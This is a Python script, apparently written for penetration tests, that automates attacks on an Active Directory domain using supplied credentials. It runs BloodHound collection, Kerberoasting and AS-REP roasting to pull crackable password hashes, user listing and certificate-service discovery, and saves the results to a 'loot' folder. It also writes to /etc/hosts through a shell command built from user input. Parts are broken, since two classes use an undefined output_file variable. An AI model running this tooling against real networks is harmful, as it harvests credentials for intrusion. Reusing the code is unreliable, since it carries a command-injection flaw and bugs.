# Author: Abb3rrant (Robert Cooper)

import subprocess
import os
import concurrent.futures
from abc import ABC, abstractmethod

OUTPUT_DIR = "/tmp/ad_loot/"
if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

class ToolRunner(ABC):
    def __init__(self, domain, dc_ip, dc_hostname, target_ip, username, password, client_agency):
        self.domain = domain
        self.dc_ip = dc_ip
        self.dc_hostname = dc_hostname
        self.target_ip = target_ip
        self.username = username
        self.password = password
        self.client_agency = client_agency

    @abstractmethod
    def get_command(self):
        pass

    def run(self):
        cmd = self.get_command()
        output_file = os.path.join(OUTPUT_DIR, f"{self.__class__.__name__}_output.txt")
        try:
            with open(output_file, "w") as f:
                result = subprocess.run(cmd, stdout=f, stderr=f, text=True)
            return f"{self.__class__.__name__} completed. Output saved to {output_file}"
        except Exception as e:
            return f"{self.__class__.__name__} failed: {str(e)}"

class BloodhoundRunner(ToolRunner):
    def get_command(self):
        return [
            "bloodhound-python",
            "-u", self.username,
            "-p", self.password,
            "-d", self.domain,
            "-dc", self.dc_hostname,
            "-c", "DCOnly",
            "--zip", output_file
        ]

class Impacket_GetUserSPNs(ToolRunner):
    def get_command(self):
        output_file = os.path.join(OUTPUT_DIR, f"{self.client_agency}_tgs.txt")
        return [
            "impacket-GetUserSPNs",
            "-request",
            f"{self.domain}/{self.username}:{self.password}",
            "-dc-ip", self.dc_ip,
            "-outputfile", output_file
        ]

class Impacket_GetNPUsers(ToolRunner):
    def get_command(self):
        output_file = os.path.join(OUTPUT_DIR, f"{self.client_agency}_asrep.txt")
        return [
            "impacket-GetNPUsers",
            "-request",
            f"{self.domain}/{self.username}:{self.password}",
            "-dc-ip", self.dc_ip,
            "-format", "hashcat",
            "-outputfile", output_file
        ]

class Impacket_GetADUsers(ToolRunner):
    def get_command(self):
        return [
            "impacket-GetADUsers",
            f"{self.domain}/{self.username}:{self.password}",
            "-dc-ip", self.dc_ip,
            "-all"
        ]

class Certipy(ToolRunner):
    def get_command(self):
        return [
            "certipy-ad",
            "find",
            "-u", self.username,
            "-p", self.password,
            "-dc-ip", self.dc_ip,
            "-outputfile", output_file
        ]

class ADEnumerator:
    def __init__(self):
        self.domain = input("Enter domain (e.g., example.com): ")
        self.dc_hostname = input("Enter DC Hostname: ")
        self.dc_ip = input("Enter DC IP (e.g., 192.168.1.10): ")
        self.target_ip = input("Enter target IP (e.g., 192.168.1.20): ")
        self.username = input("Enter username: ")
        self.password = input("Enter password: ")
        self.client_agency = input("Enter Agency Name: ")
        self.update_hosts_file()
        self.tools = [
            BloodhoundRunner(self.domain, self.dc_ip, self.dc_hostname, self.target_ip, self.username, self.password, self.client_agency),
            Impacket_GetUserSPNs(self.domain, self.dc_ip, self.dc_hostname, self.target_ip, self.username, self.password, self.client_agency),
            Impacket_GetNPUsers(self.domain, self.dc_ip, self.dc_hostname, self.target_ip, self.username, self.password, self.client_agency),
            Impacket_GetADUsers(self.domain, self.dc_ip, self.dc_hostname, self.target_ip, self.username, self.password, self.client_agency),
            Certipy(self.domain, self.dc_ip, self.dc_hostname, self.target_ip, self.username, self.password, self.client_agency)
        ]

    def update_hosts_file(self):
        hosts_entry = f"{self.dc_ip} {self.dc_hostname}"
        with open("/etc/hosts", "r") as f:
            if hosts_entry in f.read():
                print(f"Hosts entry '{hosts_entry}' already exists.")
                return

        try:
            cmd = ["echo", hosts_entry, "|", "sudo", "tee", "-a", "/etc/hosts", ">", "/dev/null"]
            subprocess.run(" ".join(cmd), shell=True, check=True)
            print(f"Added '{hosts_entry}' to /etc/hosts.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to update /etc/hosts. Run with sudo or check permissions: {e}")
            exit(1)

    def run_all(self):
        print("Starting AD enumeration...")
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = [executor.submit(tool.run) for tool in self.tools]
            for future in concurrent.futures.as_completed(futures):
                print(future.result())
        print(f"All tools completed. Check outputs in {OUTPUT_DIR}")

if __name__ == "__main__":
    enumerator = ADEnumerator()
    enumerator.run_all()
